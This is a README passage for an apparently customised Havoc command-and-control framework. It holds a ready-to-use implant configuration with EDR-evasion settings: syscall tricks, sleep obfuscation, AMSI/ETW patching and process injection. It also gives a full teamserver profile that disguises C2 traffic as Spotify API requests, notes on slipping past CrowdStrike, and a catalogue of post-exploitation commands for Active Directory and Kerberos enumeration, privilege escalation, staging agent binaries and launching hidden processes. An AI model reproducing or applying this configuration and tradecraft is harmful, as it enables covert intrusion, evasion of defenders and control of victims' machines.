
### **Red Team Usage**

#### **Payload Configuration**

- **Architecture**: x64
- **Format**: Windows Shellcode

**Config**:
- **Sleep**: 5
- **Jitter**: 25
- **Indirect Syscall**: ✔️
- **Stack Duplication**: ✔️
- **Sleep Technique**: Foliage
- **Sleep Jmp Gadget**: `jmp rbx`
- **Proxy Loading**: RtlQueueWorkItem
- **Amsi/ETW Patch**: Hardware breakpoints

**Injection**:
- **Alloc**: Native/Syscall
- **Execute**: Native/Syscall
- **Spawn64**: `C:\Windows\System32\notepad.exe`

#### **Profile Configuration**

- **Havoc Documentation - Profiles**: [havoc-profiles](https://havocframework.com/docs/profiles)

- **Example Profile - `spotify.yaotl`**  

```yaotl
Teamserver {
    Host = "0.0.0.0"
    Port = 40056

    Build {
        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "operator" {
        Password = "password1234"
    }
}

Listeners {
    Http {
        Name         = "spotify profile - http"
        Hosts        = [
            "myprivatevpn.com",  
        ]
        HostBind     = "8.209.128.8"   
        PortBind     = 443
        PortConn     = 443         
        HostRotation = "round-robin" 
        Secure       = false       
        UserAgent    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Spotify/1.1.10.540"
        Uris         = ["/v1/me/player/currently-playing", "/v1/me/player/recently-played"]
        Headers = [
            "Accept: application/json",
            "Referer: https://open.spotify.com/",
            "Accept-Encoding: gzip, deflate, br",
            "Origin: https://open.spotify.com"
        ]

        Response {
            Headers = [
                "Content-type: text/plain, charset=utf-8",
                "Access-Control-Allow-Origin: https://spotify.com",
                "Connection: keep-alive",
                "Cache-control: no-cache"
            ]
        }
    }

    Smb {
        Name     = "Pivot - Smb"
        PipeName = "Winsock2\\CatalogChangeListener-777-0"
    }
}

Service {
    Endpoint = "service-endpoint"
    Password = "service-password"
}

Demon {
    Sleep = 5
    Jitter = 25

    TrustXForwardedFor = false

    Injection {
        Spawn64 = "C:\\Windows\\System32\\Werfault.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\Werfault.exe"
    }

    Binary {
        ReplaceStrings-x64 = {
            "demon.x64.dll": "",
            "This program cannot be run in DOS mode.": ""
        }
    }
}
```

- **Use Profile - `./havoc server --profile ./profiles/spotify.yaotl -v --debug`**  

#### **Import Module**

- **Example**: Using [havoc-privkit](https://github.com/p4p1/havoc-privkit)
- Clone into the root directory of RT-Havoc folder:
```bash git clone --recurse-submodules --remote-submodules https://github.com/p4p1/havoc-privkit```
- Within Havoc GUI go to Scripts -> Script Manager -> Load Script (Add the path to privkit.py)

#### **Develop Module**

- **Havoc Documentation - Object Files**: [havoc-bofs](https://havocframework.com/docs/object_files)
- **Example of how to pack different parameter types**: [LatLoader.py](https://github.com/icyguider/LatLoader/blob/main/LatLoader.py)
- **Resource for BOF function declarations**:[bofdefs.h](https://github.com/trustedsec/CS-Remote-OPs-BOF/blob/main/src/common/bofdefs.h)

#### **OPSEC**

- **HTTPS Listener**: Application Data Protocol: http-over-tls, uses TLSv1.2 and the data is encrypted.
- **Payload Config Option - Amsi/ETW Patch**: Fails against CrowdStrike with dot inline-execute, exception is when under WSL (CrowdStrike doesn't hook process)
- **Observations**: cp, move, mkdir, and remove will fail if trying to perform action within the WSL folder structure. The PowerShell module will fail when trying to pass a complex command when used under WSL. The upload and download modules are not functional when using WSL.
- **Useful Modules/Commands**: In my testing, if we make it into memory without detection, we are able to run most of the built-in commands/modules. These commands/modules are all BOF files that use inline-execute. 

  - `adcs_enum` - Enumerate CAs and templates in the AD using Win32 functions  
    Example: `adcs_enum`

  - `adcs_request` - Request an enrollment certificate
    Example: `adcs_request`

  - `arp` - Lists out ARP table  
    Example: `arp`

  - `bofbelt` - A Seatbelt port using BOFs  
    Example: `bofbelt`

  - `cacls` - List user permissions for the specified file, wildcards supported  
    Example: `cacls C:\\Windows\\`

  - `cat` - Display content of the specified file  
    Example: `cat C:\\Users\\secret.txt`

  - `cd` - Change to specified directory  
    Example: `cd C:\\Users\\`

  - `cp` - Copy file from one location to another
    Example: `cp secret.txt C:\\Users\\Public`

  - `dcenum` - Enumerate domain information using Active Directory Domain Services  
    Example: `dcenum`

  - `dir` - list specified directory 
    Example: `dir`

  - `domainenum` - Lists user accounts in the current domain  
    Example: `domainenum`

  - `dotnet` - lists installed/available dotnet versions 
    Example: `dotnet list-versions`

  - `download` - downloads a specified file 
    Example: `download`

  - `driversigs` - checks drivers for known edr vendor names 
    Example: `driversigs`

  - `enum_filter_driver` - Enumerate filter drivers 
    Example: `enum_filter_driver`

  - `enumlocalsessions` - Enumerate currently attached user sessions both local and over RDP 
    Example: `enumlocalsessions`

  - `env` - Print environment variables.
    Example: `env`

  - `exit` - cleanup and exit
    Example: `exit`

  - `get-asrep  ` - Enumerate a given domain for user accounts with ASREP.
     Example: `get-asrep  `

  - `get-delegation ` - Enumerate a given domain for different types of abusable Kerberos Delegation settings.
     Example: `get-delegation `

  - `get-netsession  ` - Enumerate sessions on the local or specified computer
     Example: `get-netsession  `

  - `get-spns ` - Enumerate a given domain for user accounts with SPNs.
     Example: `get-spns `

  - `get_password_policy ` - Gets a server or DC's configured password policy
     Example: `get_password_policy `

  - `ipconfig ` - Lists out adapters, system hostname and configured dns serve
     Example: `ipconfig `

  - `klist ` - list Kerberos tickets
     Example: `klist `

  - `listdns ` - lists dns cache entries
     Example: `listdns `

  - `locale ` - Prints locale information
    Example: `locale `

  - `mkdir ` - create new directory
    Example: `mkdir secret`

  - `mv ` - move file from one location to another
    Example: `mv agent.exe C:\\Users\\Public`

  - `net ` - network and host enumeration module
    Example: `net users`

  - `netshares ` - List shares on local or remote computer
    Example: `netshares `

  - `netstat ` - List listening and connected ipv4 udp and tcp connections
    Example: `netstat `

  - `netuser ` - Get info about specific user. Pull from domain if a domainname is specified
    Example: `netuser `

  - `netview ` - lists local workstations and servers
    Example: `netview `

  - `noconsolation` - Execute a PE inline - *Note* - Runs binaries from the attacker machine
    Example: `noconsolation zoom.exe `

  - `nslookup ` - Make a DNS query. DNS server is the server you want to query (do not specify or 0 for default). Record type is something
    Example: `nslookup `

  - `powerpick ` - executes unmanaged powershell commands
    Example: `powerpick whoami `

  - `powershell ` - executes powershell.exe commands and gets the output - *Note* - Fails when trying to set credentialed object and then run script with it via command concatentation
    Example: `powershell -c "Start-Process -FilePath 'C:\Users\Public\com.exe' -WindowStyle Hidden" `

  - `privkit ` - Privilege Escalation Module - *Note* - Use cautiously, as the results retrieved isn't necessarily worth the risk of detection.
    Example: `privkit all `

  - `proc ` - process enumeration and management
    Example: `proc list `

  - `pwd ` - get current directory
    Example: `pwd `

  - `quser ` - Simple implementation of quser.exe usingt the Windows API
    Example: `quser `

  - `remove ` - remove file or directory
    Example: `remove log.txt`

  - `routeprint ` - prints ipv4 routes on the machine
    Example: `routeprint `

  - `sc_query ` - sc query implementation in BOF
    Example: `sc_query `

  - `schtasksenum ` - Enumerate scheduled tasks on the local or remote computer
    Example: `schtasksenum `

  - `schtasksquery ` - Query the given task on the local or remote computer
    Example: `schtasksquery `

  - `sessions ` - get logon sessions
    Example: `sessions `

  - `shell ` - executes cmd.exe commands and gets the output
    Example: `shell com.exe`

  - `tasklist ` - This command displays a list of currently running processes on either a local or remote machine.
    Example: `tasklist `

  - `upload ` - uploads a specified file
    Example: `upload agent.exe .`

  - `userenum ` - Lists user accounts on the current computer
    Example: `userenum `

  - `whoami ` - get the info from whoami /all without starting cmd.exe
    Example: `whoami `



